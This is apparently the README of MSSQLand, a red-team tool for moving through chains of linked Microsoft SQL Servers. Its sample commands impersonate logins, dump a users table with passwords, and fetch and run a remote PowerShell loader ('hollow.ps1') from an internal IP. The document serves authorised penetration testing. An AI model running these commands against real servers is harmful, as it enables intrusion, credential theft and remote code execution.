# MSSQLand 
Land gracefully in your target MSSQL DBMS, as if arriving on a business-class flight with a champagne glass in hand. 🥂

<p align="center">
    <img width="350" src="/media/MSSQLand__icon.webp" alt="MSSQLand Logo">
</p>

MSSQLand is your ultimate tool for interacting with Microsoft SQL Server (MSSQL) database management system (DBMS) in your red activities. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.

The tool's precise and structured output is surrounded by timestamps and enriched with useful information, making it perfect for capturing beautiful screenshots in your reports.

For example, running this command:
```shell
MSSQLand.exe /t:SQL01:webapp01 /u:mjo /p:yapot117 /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:rows balard..users
```

Create the following output:
```txt
====================================
  Start at 2025-01-15 21:53:53 UTC
====================================
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Workstation ID: SQL11
|-> Server Version: 15.00.2000
|-> Database: master
|-> Client Connection ID: 09dfa162-725c-4aaa-9881-f788ed282db4
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp11
[>] Executing action: Rows
|-> Retrieving rows from [balard].[dbo].[users]

| id | name         | password            |
| -- | ------------ | ------------------- |
| 0  | Jacquard     | Jacqu@rd!1940%Tr1c  |
| 1  | Calot        | C@l0t$Agent#42%Espi |
| 2  | Moulinier    | Moul!ni3r#V1ve*FR@  |

====================================
  End at 2025-01-15 21:53:53 UTC
  Total duration: 0.11 seconds
====================================
```

## Show Time 👑
The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` as `user1`. Then you need to impersonate `user2` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `user3` in order to go further and so on and so forth.

Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you! 🎯

After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? No thanks. Let MSSQLand  handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:

```shell
MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
```

The output is as follows:
```txt
====================================
  Start at 2025-01-14 21:31:39 UTC
====================================
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Workstation ID: SQL01
|-> Server Version: 15.00.2000
|-> Database: master
|-> Client Connection ID: 1e8fd867-77b7-4330-8d0d-deff353e5dcc
[i] Logged in as NT AUTHORITY\SYSTEM
|-> Mapped to the user dbo
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp01
[i] Execution chain: localhost -> SQL02 -> SQL03 -> SQL04
[i] Logged in as webapp05
|-> Mapped to the user dbo
[>] Executing action: Links
|-> Retrieving Linked SQL Servers

| Linked Server | product    | provider | data_source | Local Login | Is Self Mapping | Remote Login |
| ------------- | ---------- | -------- | ----------- | ----------- | --------------- | ------------ |
| SQL05         | SQL Server | SQLNCLI  | SQL04       | webapp05    | False           | webadmin     |

====================================
  End at 2025-01-14 21:31:39 UTC
  Total duration: 0.08 seconds
====================================
```

Now you want to verify who you can impersonate at the end of the chain:
```shell
MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
```
The output shows:

```txt
====================================
  Start at 2025-01-14 21:35:22 UTC
====================================
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Workstation ID: SQL01
|-> Server Version: 15.00.2000
|-> Database: master
|-> Client Connection ID: a6a69aa9-b8cc-4c93-9bc4-c162dc67806f
[>] Attempting to impersonate user: webapp11
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp11
[i] Server chain: SQL11 -> SQL27 -> SQL53
[i] Logged in as webapps
|-> Mapped to the user guest
[>] Executing action: Impersonation
|-> Starting impersonation check for all logins
|-> Checking impersonation permissions individually

| Logins      | Impersonation |
| ----------- | ------------- |
| sa          | No            |
| Jacquard    | Yes           |
| Calot       | No            |
| Moulinier   | No            |

====================================
  End at 2025-01-14 21:35:22  UTC
  Total duration: 0.10 seconds
====================================
```

Great! Now you can directly reach out to your loader with:
```shell
MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
```

And yes, all the outputted tables are Markdown friendly. What a kind gesture!

## Options and Features ⚙️

### Too Much Output?
Use the `/silent` switch for a streamlined experience. It minimizes output, showing only the action results, making it particularly useful for some engagements where less is more.

## Project Structure 📚

### `Actions`
This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.

### `Services`
The backbone of the application, responsible for connection management, query execution, user management, and configuration handling.

### `Utilities`
Helper classes like Logger and MarkdownFormatter that make your life easier.

### `Models` Folder
Contains classes representing SQL Server entities, such as Server and LinkedServers.

## Contributing 🫂

Contributions to MSSQLand are welcome and appreciated! Whether it's fixing bugs, adding new features, improving the documentation, or sharing feedback, your effort is valued and makes a difference.
Open-source thrives on collaboration and recognition. Contributions, large or small, help improve the tool and its community. Your time and effort are truly valued. 

Here, no one will be erased from Git history. No fear to have here—no one will copy-paste your code without adhering to the collaborative ethos of open-source.

Please see the [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines on how to get started.

## Disclaimer ⚠️
This tool is designed for educational purposes only and is intended to assist security professionals in understanding and testing the security of SQL Server environments in authorized engagements. It is specifically crafted to be used in controlled environments, such as:
- Penetration testing labs (e.g., HackTheBox, TryHackMe, OffSec exam scenarios).
- Personal lab setups designed for ethical hacking and security research.

## Important Note
Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.

Use responsibly and ethically. Always respect the law and obtain proper authorization.
